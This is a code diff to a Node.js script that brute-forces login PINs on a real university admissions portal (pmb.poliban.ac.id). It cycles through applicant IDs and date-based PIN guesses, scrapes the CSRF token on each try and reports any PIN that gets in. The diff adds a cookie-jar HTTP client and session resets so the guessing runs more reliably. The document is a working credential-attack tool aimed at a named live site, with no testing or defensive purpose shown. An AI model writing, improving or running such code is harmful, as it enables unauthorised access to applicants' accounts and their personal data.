@@ -1,12 +1,30 @@
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
+const { wrapper } = require('axios-cookiejar-support');
+const { CookieJar } = require('tough-cookie');
+
 const BASE_URL = 'https://pmb.poliban.ac.id';
 const UA =
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
   "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
 const jobs = {};
 
+function createClient() {
+  const jar = new CookieJar();
+  const client = wrapper(
+    axios.create({
+      jar,
+      withCredentials: true,
+      baseURL: BASE_URL,
+      timeout: 0,
+      maxRedirects: 99999,
+      headers: { "User-Agent": UA },
+      validateStatus: (s) => s >= 200 && s < 500,
+    })
+  );
+  return { client, jar };
+}
 let countError = 0;
 
 async function main(nomor, startsss, endsss, account = null) {
@@ -74,13 +92,13 @@ function loadAccounts() {
 
 async function login(idpendaftar, nama, startss, endss, nomor) {
   const job = jobs[nomor];
-  //const { client, jar } = createClient();
+  const { client, jar } = createClient();
   const g = gen(startss, endss);
   let pin = g.next();
   try {
     while (true) {
       job.coba++;
-      const { data: html } = await axios.get('https://pmb.poliban.ac.id/login');
+      const { data: html } = await client.get('/login');
       const tokenMatch = html.match(/name="_token"\s+value="([^"]+)"/);
       if (!tokenMatch) {
         console.log('CSRF token tidak ditemukan di halaman login');
@@ -100,6 +118,7 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
         waktuPrev: `Waktu: ${fmt(job.timePrev)} | Prev: ${job.prev}`,
         waktuNext: `Waktu: ${fmt(Date.now() - job.start)} | Next ID: ${job.next}`,
         running: fmt(Date.now() - job.starts),
+        html
       };
       /*console.clear();
       console.log("---------------");
@@ -120,14 +139,13 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
         _token: token,
       });
       
-      const res = await axios.post('https://pmb.poliban.ac.id/login', body.toString(), {
+      const res = await client.post('/login', body.toString(), {
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
           'Referer': `${BASE_URL}/login`,
           'Origin': BASE_URL,
         }
       });
-      job.statusData.datas = res.data;
       
       const finalUrl = res.request?.res?.responseUrl ?? res.config.url;
       if (!finalUrl.includes('/login')) {
@@ -135,7 +153,7 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
         job.timePrev = Date.now() - job.start;
         console.log('Login berhasil! PIN: ' + pin);
         g.reset();
-        //jar.removeAllCookiesSync();
+        jar.removeAllCookiesSync();
         return pin;
       } else {
         //console.log(`PIN ${pin} salah.. Skip..`);
@@ -144,7 +162,7 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
           console.log("Sudah mencoba semua kombinasi tanggal, tidak ada yang cocok. Skipped..");
           g.reset();
           job.coba = 0;
-          //jar.removeAllCookiesSync();
+          jar.removeAllCookiesSync();
           return "Tidak Ada";
         }
       }
@@ -152,7 +170,7 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
   } catch (err) {
     console.error(err);
     saveError(err);
-    //jar.removeAllCookiesSync();
+    jar.removeAllCookiesSync();
     g.reset();
     job.coba = 0;
     //await login(idpendaftar, nama, no, startss, endss);
